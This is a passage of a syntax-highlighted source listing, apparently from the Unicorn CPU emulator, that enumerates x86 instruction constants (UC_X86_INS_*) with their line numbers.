UC_X86_INS_CMPSS,<br><span class="hljs-number">102</span>    UC_X86_INS_CMPSW,<br><span class="hljs-number">103</span>    UC_X86_INS_CMPXCHG16B,<br><span class="hljs-number">104</span>    UC_X86_INS_CMPXCHG,<br><span class="hljs-number">105</span>    UC_X86_INS_CMPXCHG8B,<br><span class="hljs-number">106</span>    UC_X86_INS_COMISD,<br><span class="hljs-number">107</span>    UC_X86_INS_COMISS,<br><span class="hljs-number">108</span>    UC_X86_INS_FCOMP,<br><span class="hljs-number">109</span>    UC_X86_INS_FCOMPI,<br><span class="hljs-number">110</span>    UC_X86_INS_FCOMI,<br><span class="hljs-number">111</span>    UC_X86_INS_FCOM,<br><span class="hljs-number">112</span>    UC_X86_INS_FCOS,<br><span class="hljs-number">113</span>    UC_X86_INS_CPUID,<br><span class="hljs-number">114</span>    UC_X86_INS_CQO,<br><span class="hljs-number">115</span>    UC_X86_INS_CRC32,<br><span class="hljs-number">116</span>    UC_X86_INS_CVTDQ2PD,<br><span class="hljs-number">117</span>    UC_X86_INS_CVTDQ2PS,<br><span class="hljs-number">118</span>    UC_X86_INS_CVTPD2DQ,<br><span class="hljs-number">119</span>    UC_X86_INS_CVTPD2PS,<br><span class="hljs-number">120</span>    UC_X86_INS_CVTPS2DQ,<br><span class="hljs-number">121</span>    UC_X86_INS_CVTPS2PD,<br><span class="hljs-number">122</span>    UC_X86_INS_CVTSD2SI,<br><span class="hljs-number">123</span>    UC_X86_INS_CVTSD2SS,<br><span class="hljs-number">124</span>    UC_X86_INS_CVTSI2SD,<br><span class="hljs-number">125</span>    UC_X86_INS_CVTSI2SS,<br><span class="hljs-number">126</span>    UC_X86_INS_CVTSS2SD,<br><span class="hljs-number">127</span>    UC_X86_INS_CVTSS2SI,<br><span class="hljs-number">128</span>    UC_X86_INS_CVTTPD2DQ,<br><span class="hljs-number">129</span>    UC_X86_INS_CVTTPS2DQ,<br><span class="hljs-number">130</span>    UC_X86_INS_CVTTSD2SI,<br><span class="hljs-number">131</span>    UC_X86_INS_CVTTSS2SI,<br><span class="hljs-number">132</span>    UC_X86_INS_CWD,<br><span class="hljs-number">133</span>    UC_X86_INS_CWDE,<br><span class="hljs-number">134</span>    UC_X86_INS_DAA,<br><span class="hljs-number">135</span>    UC_X86_INS_DAS,<br><span class="hljs-number">136</span>    UC_X86_INS_DATA16,<br><span class="hljs-number">137</span>    UC_X86_INS_DEC,<br><span class="hljs-number">138</span>    UC_X86_INS_DIV,<br><span class="hljs-number">139</span>    UC_X86_INS_DIVPD,<br><span class="hljs-number">140</span>    UC_X86_INS_DIVPS,<br><span class="hljs-number">141</span>    UC_X86_INS_FDIVR,<br><span class="hljs-number">142</span>    UC_X86_INS_FIDIVR,<br><span class="hljs-number">143</span>    UC_X86_INS_FDIVRP,<br><span class="hljs-number">144</span>    UC_X86_INS_DIVSD,<br><span class="hljs-number">145</span>    UC_X86_INS_DIVSS,<br><span class="hljs-number">146</span>    UC_X86_INS_FDIV,<br><span class="hljs-number">147</span>    UC_X86_INS_FIDIV,<br><span class="hljs-number">148</span>    UC_X86_INS_FDIVP,<br><span class="hljs-number">149</span>    UC_X86_INS_DPPD,<br><span class="hljs-number">150</span>    UC_X86_INS_DPPS,<br><span class="hljs-number">151</span>    UC_X86_INS_RET,<br><span class="hljs-number">152</span>    UC_X86_INS_ENCLS,<br><span class="hljs-number">153</span>    UC_X86_INS_ENCLU,<br><span class="hljs-number">154</span>    UC_X86_INS_ENTER,<br><span class="hljs-number">155</span>    UC_X86_INS_EXTRACTPS,<br><span class="hljs-number">156</span>    UC_X86_INS_EXTRQ,<br><span class="hljs-number">157</span>    UC_X86_INS_F2XM1,<br><span class="hljs-number">158</span>    UC_X86_INS_LCALL,<br><span class="hljs-number">159</span>    UC_X86_INS_LJMP,<br><span class="hljs-number">160</span>    UC_X86_INS_FBLD,<br><span class="hljs-number">161</span>    UC_X86_INS_FBSTP,<br><span class="hljs-number">162</span>    UC_X86_INS_FCOMPP,<br><span class="hljs-number">163</span>    UC_X86_INS_FDECSTP,<br><span class="hljs-number">164</span>    UC_X86_INS_FEMMS,<br><span class="hljs-number">165</span>    UC_X86_INS_FFREE,<br><span class="hljs-number">166</span>    UC_X86_INS_FICOM,<br><span class="hljs-number">167</span>    UC_X86_INS_FICOMP,<br><span class="hljs-number">168</span>    UC_X86_INS_FINCSTP,<br><span class="hljs-number">169</span>    UC_X86_INS_FLDCW,<br><span class="hljs-number">170</span>    UC_X86_INS_FLDENV,<br><span class="hljs-number">171</span>    UC_X86_INS_FLDL2E,<br><span class="hljs-number">172</span>    UC_X86_INS_FLDL2T,<br><span class="hljs-number">173</span>    UC_X86_INS_FLDLG2,<br><span class="hljs-number">174</span>    UC_X86_INS_FLDLN2,<br><span class="hljs-number">175</span>    UC_X86_INS_FLDPI,<br><span class="hljs-number">176</span>    UC_X86_INS_FNCLEX,<br><span class="hljs-number">177</span>    UC_X86_INS_FNINIT,<br><span class="hljs-number">178</span>    UC_X86_INS_FNOP,<br><span class="hljs-number">179</span>    UC_X86_INS_FNSTCW,<br><span class="hljs-number">180</span>    UC_X86_INS_FNSTSW,<br><span class="hljs-number">181</span>    UC_X86_INS_FPATAN,<br><span class="hljs-number">182</span>    UC_X86_INS_FPREM,<br><span class="hljs-number">183</span>    UC_X86_INS_FPREM1,<br><span class="hljs-number">184</span>    UC_X86_INS_FPTAN,<br><span class="hljs-number">185</span>    UC_X86_INS_FFREEP,<br><span class="hljs-number">186</span>    UC_X86_INS_FRNDINT,<br><span class="hljs-number">187</span>    UC_X86_INS_FRSTOR,<br><span class="hljs-number">188</span>    UC_X86_INS_FNSAVE,<br><span class="hljs-number">189</span>    UC_X86_INS_FSCALE,<br><span class="hljs-number">190</span>    UC_X86_INS_FSETPM,<br><span class="hljs-number">191</span>    UC_X86_INS_FSINCOS,<br><span class="hljs-number">192</span>    UC_X86_INS_FNSTENV,<br><span class="hljs-number">193</span>    UC_X86_INS_FXAM,<br><span class="hljs-number">194</span>    UC_X86_INS_FXRSTOR,<br><span class="hljs-number">195</span>    UC_X86_INS_FXRSTOR64,<br><span class="hljs-number">196</span>    UC_X86_INS_FXSAVE,<br><span class="hljs-number">197</span>    UC_X86_INS_FXSAVE64,<br><span class="hljs-number">198</span>    UC_X86_INS_FXTRACT,<br><span class="hljs-number">199</span>    UC_X86_INS_FYL2X,<br><span class="hljs-number">200</span>    UC_X86_INS_FYL2XP1,<br><span class="hljs-number">201</span>    UC_X86_INS_MOVAPD,<br><span class="hljs-number">202</span>    UC_X86_INS_MOVAPS,<br><span class="hljs-number">203</span>    UC_X86_INS_ORPD,<br><span class="hljs-number">204</span>    UC_X86_INS_ORPS,<br><span class="hljs-number">205</span>    UC_X86_INS_VMOVAPD,<br><span class="hljs-number">206</span>    UC_X86_INS_VMOVAPS,<br><span class="hljs-number">207</span>    UC_X86_INS_XORPD,<br><span class="hljs-number">208</span>    UC_X86_INS_XORPS,<br><span class="hljs-number">209</span>    UC_X86_INS_GETSEC,<br><span class="hljs-number">210</span>    UC_X86_INS_HADDPD,<br><span class="hljs-number">211</span>    UC_X86_INS_HADDPS,<br><span class="hljs-number">212</span>    UC_X86_INS_HLT,<br><span class="hljs-number">213</span>    UC_X86_INS_HSUBPD,<br><span class="hljs-number">214</span>    UC_X86_INS_HSUBPS,<br><span class="hljs-number">215</span>    UC_X86_INS_IDIV,<br><span class="hljs-number">216</span>    UC_X86_INS_FILD,<br><span class="hljs-number">217</span>    UC_X86_INS_IMUL,<br><span class="hljs-number">218</span>    UC_X86_INS_IN,<br><span class="hljs-number">219</span>    UC_X86_INS_INC,<br><span class="hljs-number">220</span>    UC_X86_INS_INSB,<br><span class="hljs-number">221</span>    UC_X86_INS_INSERTPS,<br><span class="hljs-number">222</span>    UC_X86_INS_INSERTQ,<br><span class="hljs-number">223</span>    UC_X86_INS_INSD,<br><span class="hljs-number">224</span>    UC_X86_INS_INSW,<br><span class="hljs-number">225</span>    UC_X86_INS_INT,<br><span class="hljs-number">226</span>    UC_X86_INS_INT1,<br><span class="hljs-number">227</span>    UC_X86_INS_INT3,<br><span class="hljs-number">228</span>    UC_X86_INS_INTO,<br><span class="hljs-number">229</span>    UC_X86_INS_INVD,<br><span class="hljs-number">230</span>    UC_X86_INS_INVEPT,<br><span class="hljs-number">231</span>    UC_X86_INS_INVLPG,<br><span class="hljs-number">232</span>    UC_X86_INS_INVLPGA,<br><span class="hljs-number">233</span>    UC_X86_INS_INVPCID,<br><span class="hljs-number">234</span>    UC_X86_INS_INVVPID,<br><span class="hljs-number">235</span>    UC_X86_INS_IRET,<br><span class="hljs-number">236</span>    UC_X86_INS_IRETD,<br><span class="hljs-number">237</span>    UC_X86_INS_IRETQ,<br><span class="hljs-number">238</span>    UC_X86_INS_FISTTP,<br><span class="hljs-number">239</span>    UC_X86_INS_FIST,<br><span class="hljs-number">240</span>    UC_X86_INS_FISTP,<br><span class="hljs-number">241</span>    UC_X86_INS_UCOMISD,<br><span class="hljs-number">242</span>    UC_X86_INS_UCOMISS,<br><span class="hljs-number">243</span>    UC_X86_INS_VCOMISD,<br><span class="hljs-number">244</span>    UC_X86_INS_VCOMISS,<br><span class="hljs-number">245</span>    UC_X86_INS_VCVTSD2SS,<br><span class="hljs-number">246</span>    UC_X86_INS_VCVTSI2SD,<br><span class="hljs-number">247</span>    UC_X86_INS_VCVTSI2SS,<br><span class="hljs-number">248</span>    UC_X86_INS_VCVTSS2SD,<br><span class="hljs-number">249</span>    UC_X86_INS_VCVTTSD2SI,<br><span class="hljs-number">250</span>    UC_X86_INS_VCVTTSD2USI,<br><span class="hljs-number">251</span>    UC_X86_INS_VCVTTSS2SI,<br><span class="hljs-number">252</span>    UC_X86_INS_VCVTTSS2USI,<br><span class="hljs-number">253</span>    UC_X86_INS_VCVTUSI2SD,<br><span class="hljs-number">254</span>    UC_X86_INS_VCVTUSI2SS,<br><span class="hljs-number">255</span>    UC_X86_INS_VUCOMISD,<br><span class="hljs-number">256</span>    UC_X86_INS_VUCOMISS,<br><span class="hljs-number">257</span>    UC_X86_INS_JAE,<br><span class="hljs-number">258</span>    UC_X86_INS_JA,<br><span class="hljs-number">259</span>    UC_X86_INS_JBE,<br><span class="hljs-number">260</span>    UC_X86_INS_JB,<br><span class="hljs-number">261</span>    UC_X86_INS_JCXZ,<br><span class="hljs-number">262</span>    UC_X86_INS_JECXZ,<br><span class="hljs-number">263</span>    UC_X86_INS_JE,<br><span class="hljs-number">264</span>    UC_X86_INS_JGE,<br><span class="hljs-number">265</span>    UC_X86_INS_JG,<br><span class="hljs-number">266</span>    UC_X86_INS_JLE,<br><span class="hljs-number">267</span>    UC_X86_INS_JL,<br><span class="hljs-number">268</span>    UC_X86_INS_JMP,<br><span class="hljs-number">269</span>    UC_X86_INS_JNE,<br><span class="hljs-number">270</span>    UC_X86_INS_JNO,<br><span class="hljs-number">271</span>    UC_X86_INS_JNP,<br><span class="hljs-number">272</span>    UC_X86_INS_JNS,<br><span class="hljs-number">273</span>    UC_X86_INS_JO,<br><span class="hljs-number">274</span>    UC_X86_INS_JP,<br><span class="hljs-number">275</span>    UC_X86_INS_JRCXZ,<br><span class="hljs-number">276</span>    UC_X86_INS_JS,<br><span class="hljs-number">277</span>    UC_X86_INS_KANDB,<br><span class="hljs-number">278</span>    UC_X86_INS_KANDD,<br><span class="hljs-number">279</span>    UC_X86_INS_KANDNB,<br><span class="hljs-number">280</span>    UC_X86_INS_KANDND,<br><span class="hljs-number">281</span>    UC_X86_INS_KANDNQ,<br><span class="hljs-number">282</span>    UC_X86_INS_KANDNW,<br><span class="hljs-number">283</span>    UC_X86_INS_KANDQ,<br><span class="hljs-number">284</span>    UC_X86_INS_KANDW,<br><span class="hljs-number">285</span>    UC_X86_INS_KMOVB,<br><span class="hljs-number">286</span>    UC_X86_INS_KMOVD,<br><span class="hljs-number">287</span>    UC_X86_INS_KMOVQ,<br><span class="hljs-number">288</span>    UC_X86_INS_KMOVW,<br><span class="hljs-number">289</span>    UC_X86_INS_KNOTB,<br><span class="hljs-number">290</span>    UC_X86_INS_KNOTD,<br><span class="hljs-number">291</span>    UC_X86_INS_KNOTQ,<br><span class="hljs-number">292</span>    UC_X86_INS_KNOTW,<br><span class="hljs-number">293</span>    UC_X86_INS_KORB,<br><span class="hljs-number">294</span>    UC_X86_INS_KORD,<br><span class="hljs-number">295</span>    UC_X86_INS_KORQ,<br><span class="hljs-number">296</span>    UC_X86_INS_KORTESTB,<br><span class="hljs-number">297</span>    UC_X86_INS_KORTESTD,<br><span class="hljs-number">298</span>    UC_X86_INS_KORTESTQ,<br><span class="hljs-number">299</span>    UC_X86_INS_KORTESTW,<br><span class="hljs-number">300</span>    UC_X86_INS_KORW,<br><span class="hljs-number">301</span>    UC_X86_INS_KSHIFTLB,<br><span class="hljs-number">302</span>    UC_X86_INS_KSHIFTLD,<br><span class="hljs-number">303</span>    UC_X86_INS_KSHIFTLQ,<br><span class="hljs-number">304</span>    UC_X86_INS_KSHIFTLW,<br><span class="hljs-number">305</span>    UC_X86_INS_KSHIFTRB,<br><span class="hljs-number">306</span>    UC_X86_INS_KSHIFTRD,<br><span class="hljs-number">307</span>    UC_X86_INS_KSHIFTRQ,<br><span class="hljs-number">308</span>    UC_X86_INS_KSHIFTRW,<br><span class="hljs-number">309</span>    UC_X86_INS_KUNPCKBW,<br><span class="hljs-number">310</span>    UC_X86_INS_KXNORB,<br><span class="hljs-number">311</span>    UC_X86_INS_KXNORD,<br><span class="hljs-number">312</span>    UC_X86_INS_KXNORQ,<br><span class="hljs-number">313</span>    UC_X86_INS_KXNORW,<br><span class="hljs-number">314</span>    UC_X86_INS_KXORB,<br><span class="hljs-number">315</span>    UC_X86_INS_KXORD,<br><span class="hljs-number">316</span>    UC_X86_INS_KXORQ,<br><span class="hljs-number">317</span>    UC_X86_INS_KXORW,<br><span class="hljs-number">318</span>    UC_X86_INS_LAHF,<br><span class="hljs-number">319</span>    UC_X86_INS_LAR,<br><span class="hljs-number">320</span>    UC_X86_INS_LDDQU,<br><span class="hljs-number">321</span>    UC_X86_INS_LDMXCSR,<br><span class="hljs-number">322</span>    UC_X86_INS_LDS,<br><span class="hljs-number">323</span>    UC_X86_INS_FLDZ,<br><span class="hljs-number">324</span>    UC_X86_INS_FLD1,<br><span class="hljs-number">325</span>    UC_X86_INS_FLD,<br><span class="hljs-number">326</span>    UC_X86_INS_LEA,<br><span class="hljs-number">327</span>    UC_X86_INS_LEAVE,<br><span class="hljs-number">328</span>    UC_X86_INS_LES,<br><span class="hljs-number">329</span>    UC_X86_INS_LFENCE,<br><span class="hljs-number">330</span>    UC_X86_INS_LFS,<br><span class="hljs-number">331</span>    UC_X86_INS_LGDT,<br><span class="hljs-number">332</span>    UC_X86_INS_LGS,<br><span class="hljs-number">333</span>    UC_X86_INS_LIDT,<br><span class="hljs-number">334</span>    UC_X86_INS_LLDT,<br><span class="hljs-number">335</span>    UC_X86_INS_LMSW,<br><span class="hljs-number">336</span>    UC_X86_INS_OR,<br><span class="hljs-number">337</span>    UC_X86_INS_SUB,<br><span class="hljs-number">338</span>    UC_X86_INS_XOR,<br><span class="hljs-number">339</span>    UC_X86_INS_LODSB,<br><span class="hljs-number">340</span>    UC_X86_INS_LODSD,<br><span class="hljs-number">341</span>    UC_X86_INS_LODSQ,<br><span class="hljs-number">342</span>    UC_X86_INS_LODSW,<br><span class="hljs-number">343</span>    UC_X86_INS_LOOP,<br><span class="hljs-number">344</span>    UC_X86_INS_LOOPE,<br><span class="hljs-number">345</span>    UC_X86_INS_LOOPNE,<br><span class="hljs-number">346</span>    UC_X86_INS_RETF,<br><span class="hljs-number">347</span>    UC_X86_INS_RETFQ,<br><span class="hljs-number">348</span>    UC_X86_INS_LSL,<br><span class="hljs-number">349</span>    UC_X86_INS_LSS,<br><span class="hljs-number">350</span>    UC_X86_INS_LTR,<br><span class="hljs-number">351</span>    UC_X86_INS_XADD,<br><span class="hljs-number">352</span>    UC_X86_INS_LZCNT,<br><span class="hljs-number">353</span>    UC_X86_INS_MASKMOVDQU,<br><span class="hljs-number">354</span>    UC_X86_INS_MAXPD,<br><span class="hljs-number">355</span>    UC_X86_INS_MAXPS,<br><span class="hljs-number">356</span>    UC_X86_INS_MAXSD,<br><span class="hljs-number">357</span>    UC_X86_INS_MAXSS,<br><span class="hljs-number">358</span>    UC_X86_INS_MFENCE,<br><span class="hljs-number">359</span>    UC_X86_INS_MINPD,<br><span class="hljs-number">360</span>    UC_X86_INS_MINPS,<br><span class="hljs-number">361</span>    UC_X86_INS_MINSD,<br><span class="hljs-number">362</span>    UC_X86_INS_MINSS,<br><span class="hljs-number">363</span>    UC_X86_INS_CVTPD2PI,<br><span class="hljs-number">364</span>    UC_X86_INS_CVTPI2PD,<br><span class="hljs-number">365</span>    UC_X86_INS_CVTPI2PS,<br><span class="hljs-number">366</span>    UC_X86_INS_CVTPS2PI,<br><span class="hljs-number">367</span>    UC_X86_INS_CVTTPD2PI,<br><span class="hljs-number">368</span>    UC_X86_INS_CVTTPS2PI,<br><span class="hljs-number">369</span>    UC_X86_INS_EMMS,<br><span class="hljs-number">370</span>    UC_X86_INS_MASKMOVQ,<br><span class="hljs-number">371</span>    UC_X86_INS_MOVD,<br><span class="hljs-number">372</span>    UC_X86_INS_MOVDQ2Q,<br><span class="hljs-number">373</span>    UC_X86_INS_MOVNTQ,<br><span class="hljs-number">374</span>    UC_X86_INS_MOVQ2DQ,<br><span class="hljs-number">375</span>    UC_X86_INS_MOVQ,<br><span class="hljs-number">376</span>    UC_X86_INS_PABSB,<br><span class="hljs-number">377</span>    UC_X86_INS_PABSD,<br><span class="hljs-number">378</span>    UC_X86_INS_PABSW,<br><span class="hljs-number">379</span>    UC_X86_INS_PACKSSDW,<br><span class="hljs-number">380</span>    UC_X86_INS_PACKSSWB,<br><span class="hljs-number">381</span>    UC_X86_INS_PACKUSWB,<br><span class="hljs-number">382</span>    UC_X86_INS_PADDB,<br><span class="hljs-number">383</span>    UC_X86_INS_PADDD,<br><span class="hljs-number">384</span>    UC_X86_INS_PADDQ,<br><span class="hljs-number">385</span>    UC_X86_INS_PADDSB,<br><span class="hljs-number">386</span>    UC_X86_INS_PADDSW,<br><span class="hljs-number">387</span>    UC_X86_INS_PADDUSB,<br><span class="hljs-number">388</span>    UC_X86_INS_PADDUSW,<br><span class="hljs-number">389</span>    UC_X86_INS_PADDW,<br><span class="hljs-number">390</span>    UC_X86_INS_PALIGNR,<br><span class="hljs-number">391</span>    UC_X86_INS_PANDN,<br><span class="hljs-number">392</span>    UC_X86_INS_PAND,<br><span class="hljs-number">393</span>    UC_X86_INS_PAVGB,<br><span class="hljs-number">394</span>    UC_X86_INS_PAVGW,<br><span class="hljs-number">395</span>    UC_X86_INS_PCMPEQB,<br><span class="hljs-number">396</span>    UC_X86_INS_PCMPEQD,<br><span class="hljs-number">397</span>    UC_X86_INS_PCMPEQW,<br><span class="hljs-number">398</span>    UC_X86_INS_PCMPGTB,<br><span class="hljs-number">399</span>    UC_X86_INS_PCMPGTD,<br><span class="hljs-number">400</span>    UC_X86_INS_PCMPGTW,<br><span class="hljs-number">401</span>    UC_X86_INS_PEXTRW,<br><span class="hljs-number">402</span>    UC_X86_INS_PHADDSW,<br><span class="hljs-number">403</span>    UC_X86_INS_PHADDW,<br><span class="hljs-number">404</span>    UC_X86_INS_PHADDD,<br><span class="hljs-number">405</span>    UC_X86_INS_PHSUBD,<br><span class="hljs-number">406</span>    UC_X86_INS_PHSUBSW,<br><span class="hljs-number">407</span>    UC_X86_INS_PHSUBW,<br><span class="hljs-number">408</span>    UC_X86_INS_PINSRW,<br><span class="hljs-number">409</span>    UC_X86_INS_PMADDUBSW,<br><span class="hljs-number">410</span>    UC_X86_INS_PMADDWD,<br><span class="hljs-number">411</span>    UC_X86_INS_PMAXSW,<br><span class="hljs-number">412</span>    UC_X86_INS_PMAXUB,<br><span class="hljs-number">413</span>    UC_X86_INS_PMINSW,<br><span class="hljs-number">414</span>    UC_X86_INS_PMINUB,<br><span class="hljs-number">415</span>    UC_X86_INS_PMOVMSKB,<br><span class="hljs-number">416</span>    UC_X86_INS_PMULHRSW,<br><span class="hljs-number">417</span>    UC_X86_INS_PMULHUW,<br><span class="hljs-number">418</span>    UC_X86_INS_PMULHW,<br><span class="hljs-number">419</span>    UC_X86_INS_PMULLW,<br><span class="hljs-number">420</span>    UC_X86_INS_PMULUDQ,<br><span class="hljs-number">421</span>    UC_X86_INS_POR,<br><span class="hljs-number">422</span>    UC_X86_INS_PSADBW,<br><span class="hljs-number">423</span>    UC_X86_INS_PSHUFB,<br><span class="hljs-number">424</span>    UC_X86_INS_PSHUFW,<br><span class="hljs-number">425</span>    UC_X86_INS_PSIGNB,<br><span class="hljs-number">426</span>    UC_X86_INS_PSIGND,<br><span class="hljs-number">427</span>    UC_X86_INS_PSIGNW,<br><span class="hljs-number">428</span>    UC_X86_INS_PSLLD,<br><span class="hljs-number">429</span>    UC_X86_INS_PSLLQ,<br><span class="hljs-number">430</span>    UC_X86_INS_PSLLW,<br><span class="hljs-number">431</span>    UC_X86_INS_PSRAD,<br><span class="hljs-number">432</span>    UC_X86_INS_PSRAW,<br><span class="hljs-number">433</span>    UC_X86_INS_PSRLD,<br><span class="hljs-number">434</span>    UC_X86_INS_PSRLQ,<br><span class="hljs-number">435</span>    UC_X86_INS_PSRLW,<br><span class="hljs-number">436</span>    UC_X86_INS_PSUBB,<br><span class="hljs-number">437</span>    UC_X86_INS_PSUBD,<br><span class="hljs-number">438</span>    UC_X86_INS_PSUBQ,<br><span class="hljs-number">439</span>    UC_X86_INS_PSUBSB,<br><span class="hljs-number">440</span>    UC_X86_INS_PSUBSW,<br><span class="hljs-number">441</span>    UC_X86_INS_PSUBUSB,<br><span class="hljs-number">442</span>    UC_X86_INS_PSUBUSW,<br><span class="hljs-number">443</span>    UC_X86_INS_PSUBW,<br><span class="hljs-number">444</span>    UC_X86_INS_PUNPCKHBW,<br><span class="hljs-number">445</span>    UC_X86_INS_PUNPCKHDQ,<br><span class="hljs-number">446</span>    UC_X86_INS_PUNPCKHWD,<br><span class="hljs-number">447</span>    UC_X86_INS_PUNPCKLBW,<br><span class="hljs-number">448</span>    UC_X86_INS_PUNPCKLDQ,<br><span class="hljs-number">449</span>    UC_X86_INS_PUNPCKLWD,<br><span class="hljs-number">450</span>    UC_X86_INS_PXOR,<br><span class="hljs-number">451</span>    UC_X86_INS_MONITOR,<br><span class="hljs-number">452</span>    UC_X86_INS_MONTMUL,<br><span class="hljs-number">453</span>    UC_X86_INS_MOV,<br><span class="hljs-number">454</span>    UC_X86_INS_MOVABS,<br><span class="hljs-number">455</span>    UC_X86_INS_MOVBE,<br><span class="hljs-number">456</span>    UC_X86_INS_MOVDDUP,<br><span class="hljs-number">457</span>    UC_X86_INS_MOVDQA,<br><span class="hljs-number">458</span>    UC_X86_INS_MOVDQU,<br><span class="hljs-number">459</span>    UC_X86_INS_MOVHLPS,<br><span class="hljs-number">460</span>    UC_X86_INS_MOVHPD,<br><span class="hljs-number">461</span>    UC_X86_INS_MOVHPS,<br><span class="hljs-number">462</span>    UC_X86_INS_MOVLHPS,<br><span class="hljs-number">463</span>    UC_X86_INS_MOVLPD,<br><span class="hljs-number">464</span>    UC_X86_INS_MOVLPS,<br><span class="hljs-number">465</span>    UC_X86_INS_MOVMSKPD,<br><span class="hljs-number">466</span>    UC_X86_INS_MOVMSKPS,<br><span class="hljs-number">467</span>    UC_X86_INS_MOVNTDQA,<br><span class="hljs-number">468</span>    UC_X86_INS_MOVNTDQ,<br><span class="hljs-number">469</span>    UC_X86_INS_MOVNTI,<br><span class="hljs-number">470</span>    UC_X86_INS_MOVNTPD,<br><span class="hljs-number">471</span>    UC_X86_INS_MOVNTPS,<br><span class="hljs-number">472</span>    UC_X86_INS_MOVNTSD,<br><span class="hljs-number">473</span>    UC_X86_INS_MOVNTSS,<br><span class="hljs-number">474</span>    UC_X86_INS_MOVSB,<br><span class="hljs-number">475</span>    UC_X86_INS_MOVSD,<br><span class="hljs-number">476</span>    UC_X86_INS_MOVSHDUP,<br><span class="hljs-number">477</span>    UC_X86_INS_MOVSLDUP,<br><span class="hljs-number">478</span>    UC_X86_INS_MOVSQ,<br><span class="hljs-number">479</span>    UC_X86_INS_MOVSS,<br><span class="hljs-number">480</span>    UC_X86_INS_MOVSW,<br><span class="hljs-number">481</span>    UC_X86_INS_MOVSX,<br><span class="hljs-number">482</span>    UC_X86_INS_MOVSXD,<br><span class="hljs-number">483</span>    UC_X86_INS_MOVUPD,<br><span class="hljs-number">484</span>    UC_X86_INS_MOVUPS,<br><span class="hljs-number">485</span>    UC_X86_INS_MOVZX,<br><span class="hljs-number">486</span>    UC_X86_INS_MPSADBW,<br><span class="hljs-number">487</span>    UC_X86_INS_MUL,<br><span class="hljs-number">488</span>    UC_X86_INS_MULPD,<br><span class="hljs-number">489</span>    UC_X86_INS_MULPS,<br><span class="hljs-number">490</span>    UC_X86_INS_MULSD,<br><span class="hljs-number">491</span>    UC_X86_INS_MULSS,<br><span class="hljs-number">492</span>    UC_X86_INS_MULX,<br><span class="hljs-number">493</span>    UC_X86_INS_FMUL,<br><span class="hljs-number">494</span>    UC_X86_INS_FIMUL,<br><span class="hljs-number">495</span>    UC_X86_INS_FMULP,<br><span class="hljs-number">496</span>    UC_X86_INS_MWAIT,<br><span class="hljs-number">497</span>    UC_X86_INS_NEG,<br><span class="hljs-number">498</span>    UC_X86_INS_NOP,<br><span class="hljs-number">499</span>    UC_X86_INS_NOT,<br><span class="hljs-number">500</span>    UC_X86_INS_OUT,<br><span class="hljs-number">501</span>    UC_X86_INS_OUTSB,<br><span class="hljs-number">502</span>    UC_X86_INS_OUTSD,<br><span class="hljs-number">503</span>    UC_X86_INS_OUTSW,<br><span class="hljs-number">504</span>    UC_X86_INS_PACKUSDW,<br><span class="hljs-number">505</span>    UC_X86_INS_PAUSE,<br><span class="hljs-number">506</span>    UC_X86_INS_PAVGUSB,<br><span class="hljs-number">507</span>    UC_X86_INS_PBLENDVB,<br><span class="hljs-number">508</span>    UC_X86_INS_PBLENDW,<br><span class="hljs-number">509</span>    UC_X86_INS_PCLMULQDQ,<br><span class="hljs-number">510</span>    UC_X86_INS_PCMPEQQ,<br><span class="hljs-number">511</span>    UC_X86_INS_PCMPESTRI,<br><span class="hljs-number">512</span>    UC_X86_INS_PCMPESTRM,<br><span class="hljs-number">513</span>    UC_X86_INS_PCMPGTQ,<br><span class="hljs-number">514</span>    UC_X86_INS_PCMPISTRI,<br><span class="hljs-number">515</span>    UC_X86_INS_PCMPISTRM,<br><span class="hljs-number">516</span>    UC_X86_INS_PCOMMIT,<br><span class="hljs-number">517</span>    UC_X86_INS_PDEP,<br><span class="hljs-number">518</span>    UC_X86_INS_PEXT,<br><span class="hljs-number">519</span>    UC_X86_INS_PEXTRB,<br><span class="hljs-number">520</span>    UC_X86_INS_PEXTRD,<br><span class="hljs-number">521</span>    UC_X86_INS_PEXTRQ,<br><span class="hljs-number">522</span>    UC_X86_INS_PF2ID,<br><span class="hljs-number">523</span>    UC_X86_INS_PF2IW,<br><span class="hljs-number">524</span>    UC_X86_INS_PFACC,<br><span class="hljs-number">525</span>    UC_X86_INS_PFADD,<br><span class="hljs-number">526</span>    UC_X86_INS_PFCMPEQ,<br><span class="hljs-number">527</span>    UC_X86_INS_PFCMPGE,<br><span class="hljs-number">528</span>    UC_X86_INS_PFCMPGT,<br><span class="hljs-number">529</span>    UC_X86_INS_PFMAX,<br><span class="hljs-number">530</span>    UC_X86_INS_PFMIN,<br><span class="hljs-number">531</span>    UC_X86_INS_PFMUL,<br><span class="hljs-number">532</span>    UC_X86_INS_PFNACC,<br><span class="hljs-number">533</span>    UC_X86_INS_PFPNACC,<br><span class="hljs-number">534</span>    UC_X86_INS_PFRCPIT1,<br><span class="hljs-number">535</span>    UC_X86_INS_PFRCPIT2,<br><span class="hljs-number">536</span>    UC_X86_INS_PFRCP,<br><span class="hljs-number">537</span>    UC_X86_INS_PFRSQIT1,<br><span class="hljs-number">538</span>    UC_X86_INS_PFRSQRT,<br><span class="hljs-number">539</span>    UC_X86_INS_PFSUBR,<br><span class="hljs-number">540</span>    UC_X86_INS_PFSUB,<br><span class="hljs-number">541</span>    UC_X86_INS_PHMINPOSUW,<br><span class="hljs-number">542</span>    UC_X86_INS_PI2FD,<br><span class="hljs-number">543</span>    UC_X86_INS_PI2FW,<br><span class="hljs-number">544</span>    UC_X86_INS_PINSRB,<br><span class="hljs-number">545</span>    UC_X86_INS_PINSRD,<br><span class="hljs-number">546</span>    UC_X86_INS_PINSRQ,<br><span class="hljs-number">547</span>    UC_X86_INS_PMAXSB,<br><span class="hljs-number">548</span>    UC_X86_INS_PMAXSD,<br><span class="hljs-number">549</span>    UC_X86_INS_PMAXUD,<br><span class="hljs-number">550</span>    UC_X86_INS_PMAXUW,<br><span class="hljs-number">551</span>    UC_X86_INS_PMINSB,<br><span class="hljs-number">552</span>    UC_X86_INS_PMINSD,<br><span class="hljs-number">553</span>    UC_X86_INS_PMINUD,<br><span class="hljs-number">554</span>    UC_X86_INS_PMINUW,<br><span class="hljs-number">555</span>    UC_X86_INS_PMOVSXBD,<br><span class="hljs-number">556</span>    UC_X86_INS_PMOVSXBQ,<br><span class="hljs-number">557</span>    UC_X86_INS_PMOVSXBW,<br><span class="hljs-number">558</span>    UC_X86_INS_PMOVSXDQ,<br><span class="hljs-number">559</span>    UC_X86_INS_PMOVSXWD,<br><span class="hljs-number">560</span>    UC_X86_INS_PMOVSXWQ,<br><span class="hljs-number">561</span>    UC_X86_INS_PMOVZXBD,<br><span class="hljs-number">562</span>    